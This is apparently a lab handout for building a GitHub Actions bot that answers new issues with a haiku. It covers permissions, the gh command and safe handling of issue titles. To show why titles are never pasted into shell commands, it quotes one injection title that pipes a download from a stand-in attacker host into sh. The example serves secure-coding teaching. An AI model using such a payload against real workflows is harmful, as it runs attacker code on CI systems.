# Lab 3. Issue bot

**Goal:** a bot that answers every new issue with a friendly reply and a haiku.

**You will learn:** the `issues` trigger, limited permissions, posting with the `gh` command, and why text typed by strangers must be handled carefully.

## Steps

1. [ ] **Try the script on your computer or read it.** `python labs/lab3_issue_bot/reply.py --event labs/lab3_issue_bot/sample_event.json --out reply.md`
   then open `reply.md`. (Or just read `reply.py`.)
2. [ ] **Open an issue.** In the **Issues** tab, create an issue titled `Help: my workflow shows a red cross`.
   Wait about 20 seconds and reload. A comment from `github-actions` appears.
   If the Issues tab is missing: Settings > General > Features > check **Issues**.
3. [ ] **Change the bot (Stretch 1 in the code).** In `reply.py`, add a rule to `RULES`, for example `("deadline", "Deadlines ...")`.
   Commit, open a new issue with the word *deadline* in the title, and see the new reply.
4. [ ] **Swap a classmate's issue.** Ask a neighbor to open an issue in your repository (it must be public). Does the bot answer them too?

## Why the title is never pasted into a command

An issue title is typed by anyone. If a workflow wrote `${{ github.event.issue.title }}` inside a `run:` block, a title like
`"; curl evil.example | sh; "` would become part of a shell command. In this lab the script reads the title from the
event **file** instead, and `neutralize()` removes backticks, line breaks and `@mentions`.

## Check yourself

- Which permission lets the bot comment? What happens if you delete the `issues: write` line?
- Why does the bot not answer its own comment forever? (Look at the `types:` list.)
- What does `neutralize()` do to `@everyone`, and why?

## Stretch goals

- Add a second haiku to `HAIKUS`.
- Make the bot reply differently to issues whose title has more than 10 words.
- Add a step that adds a label with `gh issue edit` (the label must exist first).

## Troubleshooting

- **No comment appears:** open the Actions tab. If the run failed, read the log. If no run exists, check that workflows are enabled for the repository.
- **403 when commenting:** the `permissions:` block must contain `issues: write`.
